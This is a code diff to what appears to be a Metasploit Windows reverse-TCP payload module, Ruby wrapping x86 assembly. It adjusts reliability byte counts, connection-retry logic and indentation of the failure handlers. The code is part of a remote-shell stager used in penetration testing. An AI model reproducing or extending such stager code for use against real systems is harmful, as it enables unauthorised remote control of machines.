@@ -80,7 +80,7 @@ module Payload::Windows::ReverseTcp
     space += 8
 
     # Reliability adds some bytes!
-    space += 41
+    space += 44
 
     space += uuid_required_size if include_send_uuid
 
@@ -153,21 +153,21 @@ module Payload::Windows::ReverseTcp
 
       handle_connect_failure:
         ; decrement our attempt count and try again
-        dec dword [esi+8]
+        dec [esi+8]
         jnz try_connect
     ^
 
     if opts[:exitfunk]
       asm << %Q^
-        failure:
-          call exitfunk
-        ^
+      failure:
+        call exitfunk
+      ^
     else
       asm << %Q^
-        failure:
-          push 0x56A2B5F0       ; hardcoded to exitprocess for size
-          call ebp
-        ^
+      failure:
+        push 0x56A2B5F0         ; hardcoded to exitprocess for size
+        call ebp
+      ^
     end
 
     asm << %Q^
@@ -243,6 +243,7 @@ module Payload::Windows::ReverseTcp
         ; restore the stack back to the connection retry count
         pop esi
         pop esi
+        dec [esp]               ; decrement the counter
 
         ; try again
         jmp create_socket
